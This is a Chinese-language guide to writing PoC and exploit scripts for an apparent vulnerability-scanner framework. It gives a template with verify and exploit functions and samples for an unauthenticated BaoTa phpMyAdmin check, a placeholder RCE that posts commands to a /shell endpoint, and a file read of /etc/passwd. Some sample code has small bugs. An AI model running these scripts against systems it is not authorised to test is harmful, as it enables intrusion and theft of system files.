### [返回上层](../README.md)
# 利用脚本编写指南

## 脚本命名、漏洞类型说明规范

### [点击跳转查看](../BXGF.md)

## 脚本框架简介
``` python
import urllib.parse
import requests
import sys
import urllib3
sys.stdout.reconfigure(encoding='utf-8')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------PoC信息模块-----(固定样式，缺少参数则会引起程序报错)----------------------------------
VUL_INFO_DIC = {
    "vulID": "",            # 脚本ID，有CVE编号填CVE编号，没有CVE可以填其他的(CNVD, CNNVD)，多个优先采用CVE。
    "author": "",           # 作者名称
    "vulDate": "",          # 漏洞爆发时间。 不清楚写一个大概年限 如2021
    "createDate": "",       # 创建时间。
    "pocName": "",          # Poc漏洞名称。
    "vulLevel": "",         # 高风险；中风险；低风险。
    "pocDesc": "",          # Poc漏洞描述
    "vulVendor": "",        # 漏洞厂商
    "vulMiddleware": "",    # 漏洞组件
    "vulVersion": "",       # 漏洞受影响版本,多个版本请使用逗号分隔
    "vulType": "",          # 漏洞类型,类型参考见《PoC编写规范》PoC漏洞类型说明。
    "vulSolu": "",          # 漏洞的解决方案。
    "PoCType": "0",         # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）
    "PoCAuth": "0",         # 0 不需要认证，1 需要认证（必填）
}


# ------------------地址处理模块------（根据个人需求进行数据选择）-------------------------------------
# 说明: query=传参,  scheme=协议,  path=路径+文件名,  hostname=IP/域名,  netloc=IP/域名加端口,  port=端口
# 举例: url = "https://baidu.com:7001/zst/index.html?id=1"
# 处理后：scheme->https netloc->baidu.com:7001  hostname->www.baidu.com port->7001 path->/zst/index.html query->id=1
def urlmothod(address):
    res = urllib.parse.urlparse(address)
    port = 443 if res.port is None and res.scheme == 'https' else 80 if res.port is None and res.scheme == 'http' else res.port
    scheme, netloc, hostname, port, path, query = res.scheme, res.netloc, res.hostname, port, res.path, res.query
    return scheme, netloc, hostname, port, path, query


# ------------------验证模块-------------------------------------------------------------
# 验证模块模板(必填)(Demo)
def verify(address, cookies, proxies):
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    # -----------------------编写POC部分--------------------------------
    url = scheme + "://" + netloc + "/"
    #-------如果POC需要认证需要指定cookie，设置代理需要指定proxies
    # requests.get(url, verify=False，cookies=cookies, proxies=proxies)
    #------------------------代码部分-----------------------------------
    if True: # if 漏洞成立条件
        VUL_INFO_DIC["Payload"] = url  # 返回payload信息/URl信息/泄露信息等，酌情选择
        return VUL_INFO_DIC  # 将数据返回
    else:
        return None # 将数据返回

# ------------------验证利用模块-------------------------------------------------------------
# 利用模块模板(选填)，参考场景RCE
def exploit(address, cmd, file, cookies, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + f"/shell?cmd={cmd}"  # 指定读取的文件
    #-------如果POC需要认证需要指定cookie，设置代理需要指定proxies
    # requests.get(url, verify=False，cookies=cookies, proxies=proxies)
    #------------------------代码部分-----------------------------------
    # 返回payload信息/URl信息/泄露信息等，酌情选择
    VUL_INFO_DIC["Result"] = "响应的信息",  # 返回内容信息
    return VUL_INFO_DIC
```

# 各种脚本利用类型编写演示

## 没有利用仅验证的编写方法
没有利用方式的需要将 PoCType置为 0 当前0状态下是没有利用方式
## 举例 宝塔PMA未授权
```python
import urllib.parse
import requests
import sys
import urllib3
sys.stdout.reconfigure(encoding='utf-8')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------PoC信息模块-------------------------------------------------------------
VUL_INFO_DIC = {
    "vulID": "CNVD-2021-14826",
    "author": "Cheetah-lab",
    "vulDate": "2020-08-25",
    "createDate": "2021-7-8",
    "pocName": "宝塔数据库phpmyadmin存在未授权访问漏洞",
    "vulLevel": "中风险",
    "pocDesc": "宝塔数据库phpmyadmin存在未授权访问漏洞，攻击者可利用该漏洞未授权进入数据库修改信息。",
    "vulVendor": "广东堡塔安全技术有限公司",
    "vulMiddleware": "Bt",
    "vulVersion": "7.4.2、7.5.14测试版、6.8",
    "vulType": "Auth_Bypass",
    "vulSolu": "https://www.bt.cn/bbs/thread-54666-1-1.html",
    "PoCType": "0",  # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）
    "PoCAuth": "0",
}


# ------------------地址处理模块-------------------------------------------------------------
def urlmothod(url):
    res = urllib.parse.urlparse(url)
    port = 443 if res.port is None and res.scheme == 'https' else 80 if res.port is None and res.scheme == 'http' else res.port
    scheme, netloc, hostname, port, path, query = res.scheme, res.netloc, res.hostname, port, res.path, res.query
    return scheme, netloc, hostname, port, path, query


# ------------------验证利用模块-------------------------------------------------------------
def verify(address, cookies, proxies):
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + "/pma"
    req = requests.get(url, imeout=5, verify=False, proxies=proxies)
    if 200 == req.status_code:
        VUL_INFO_DIC["Payload"] = url
        print(f"存在漏洞：验证地址为--->{url}")
        return VUL_INFO_DIC
    else:
        print("不存在漏洞！")
        return None
```

## RCE类型
RCE检测方式不变，利用方式需要注意将PoCType置为 1 当前1状态下是RCE

利用部分可将自定义的cmd参数进行自定义替换，将返回数据进行回显

```python
import urllib.parse
import requests
import sys
import urllib3
sys.stdout.reconfigure(encoding='utf-8')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------PoC信息模块-------------------------------------------------------------
VUL_INFO_DIC = {
    # 脚本ID，有CVE编号填CVE编号，没有CVE可以填其他的(CNVD, CNNVD)，多个优先采用CVE。
    "vulID": "CVE-xxxx-xxxx",
    "author": "JE2Se",             # 作者名称
    "vulDate": "2020-12-29",       # 漏洞爆发时间。 不清楚写一个大概年限 如2021
    "createDate": "2020-12-29",    # 创建时间。
    "pocName": "RCE-Demo",   # Poc漏洞名称。
    "vulLevel": "中风险",           # High：高风险； Medium：中风险；Low：低风险。
    "pocDesc": "此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的...",   # Poc漏洞描述
    "vulVendor": "Microsoft",           # 漏洞厂商
    "vulMiddleware": "IIS",             # 漏洞组件
    "vulVersion": "8.0",                # 漏洞受影响版本,多个版本请使用逗号分隔
    "vulType": "IIS_Short_Name",        # 漏洞类型,类型参考见《PoC编写规范》PoC漏洞类型说明。
    "vulSolu": "将目标软件修复至最新版本",  # 漏洞的解决方案。
    "PoCType": "1",                     # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）
    "PoCAuth": "0",                     # 0 不需要认证，1 需要认证（必填）
}


# ------------------地址处理模块-------------------------------------------------------------
# 说明: query=传参,  scheme=协议,  path=路径+文件名,  hostname=IP/域名,  netloc=IP/域名加端口,  port=端口
# 举例: url = "https://baidu.com:7001/zst/index.html?id=1"
# 处理后：scheme->https netloc->baidu.com:7001  hostname->www.baidu.com port->7001 path->/zst/index.html query->id=1
def urlmothod(address):
    res = urllib.parse.urlparse(address)
    port = 443 if res.port is None and res.scheme == 'https' else 80 if res.port is None and res.scheme == 'http' else res.port
    scheme, netloc, hostname, port, path, query = res.scheme, res.netloc, res.hostname, port, res.path, res.query
    return scheme, netloc, hostname, port, path, query


# ------------------验证模块-------------------------------------------------------------
# 验证模块模板(必填)(Demo)
def verify(address, cookies, proxies):
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    # -----------------------编写POC部分------------------------------
    url = scheme + "://" + netloc + "/"  # https://www,baidu.com:7001/
    # Verify为https需要，如果POC需要认证需要指定cookie // requests.get(url, verify=False，cookies=cookies)
    req = requests.get(url, verify=False)
    if req.status_code == 200:   # 存在漏洞条件成立:
        VUL_INFO_DIC["Payload"] = url  # 返回payload信息/URl信息/泄露信息等，酌情选择
        return VUL_INFO_DIC  # 将数据返回
    else:
        return None  # 将数据返回

# ------------------验证利用模块-------------------------------------------------------------
# 利用模块模板(选填)，参考场景RCE


def exploit(address, cmd, file, cookie, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + f"/shell"  # 假设目标连接存在RCE漏洞
    data = {
        "shell": cmd,
    }
    req = requests.post(url, verify=False, data=data)
    VUL_INFO_DIC["Result"] = req.text,  # 返回内容信息
    return VUL_INFO_DIC

```

## 文件下载类型 - 举例
文件下载类型 检测方式不变，利用方式需要注意将PoCType置为 2 当前1状态下是文件下载

利用部分可将自定义的file参数进行自定义替换，将返回数据进行回显
```python
import urllib.parse
import requests
import sys
import urllib3
sys.stdout.reconfigure(encoding='utf-8')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------PoC信息模块-------------------------------------------------------------
VUL_INFO_DIC = {
    # 脚本ID，有CVE编号填CVE编号，没有CVE可以填其他的(CNVD, CNNVD)，多个优先采用CVE。
    "vulID": "CVE-xxxx-xxxx",
    "author": "JE2Se",             # 作者名称
    "vulDate": "2020-12-29",       # 漏洞爆发时间。 不清楚写一个大概年限 如2021
    "createDate": "2020-12-29",    # 创建时间。
    "pocName": "文件下载——Demo",   # Poc漏洞名称。
    "vulLevel": "中风险",           # High：高风险； Medium：中风险；Low：低风险。
    "pocDesc": "此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的...",   # Poc漏洞描述
    "vulVendor": "Microsoft",           # 漏洞厂商
    "vulMiddleware": "IIS",             # 漏洞组件
    "vulVersion": "8.0",                # 漏洞受影响版本,多个版本请使用逗号分隔
    "vulType": "IIS_Short_Name",        # 漏洞类型,类型参考见《PoC编写规范》PoC漏洞类型说明。
    "vulSolu": "将目标软件修复至最新版本",  # 漏洞的解决方案。
    "PoCType": "2",                     # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）
    "PoCAuth": "0",                     # 0 不需要认证，1 需要认证（必填）
}


# ------------------地址处理模块-------------------------------------------------------------
# 说明: query=传参,  scheme=协议,  path=路径+文件名,  hostname=IP/域名,  netloc=IP/域名加端口,  port=端口
# 举例: url = "https://baidu.com:7001/zst/index.html?id=1"
# 处理后：scheme->https netloc->baidu.com:7001  hostname->www.baidu.com port->7001 path->/zst/index.html query->id=1
def urlmothod(address):
    res = urllib.parse.urlparse(address)
    port = 443 if res.port is None and res.scheme == 'https' else 80 if res.port is None and res.scheme == 'http' else res.port
    scheme, netloc, hostname, port, path, query = res.scheme, res.netloc, res.hostname, port, res.path, res.query
    return scheme, netloc, hostname, port, path, query


# ------------------验证模块-------------------------------------------------------------
# 验证模块模板(必填)(Demo)
def verify(address, cookies, proxies):
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    # -----------------------编写POC部分------------------------------
    url = scheme + "://" + netloc + "/test?file=/etc/passwd"  # 假设目标存在任意文件读取
    req = requests.get(url, verify=False)  # Verify为https需要，如果POC需要认证需要指定cookie // requests.get(url, verify=False，cookies=cookies)
    if req.status_code == 200 and "root" in req.text:   # 存在漏洞条件成立:
        VUL_INFO_DIC["Payload"] = url  # 返回payload信息/URl信息/泄露信息等，酌情选择
        return VUL_INFO_DIC  # 将数据返回
    else:
        return None # 将数据返回

# ------------------验证利用模块-------------------------------------------------------------
# 利用模块模板(选填)，参考场景文件下载
def exploit(address, cmd, file, cookie, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + f"/test?file={file}"  # 指定读取的文件
    req = requests.get(url, verify=False)
    VUL_INFO_DIC["Result"] = req.text,  # 返回内容信息
    return VUL_INFO_DIC
```

### [返回上层](../README.md)
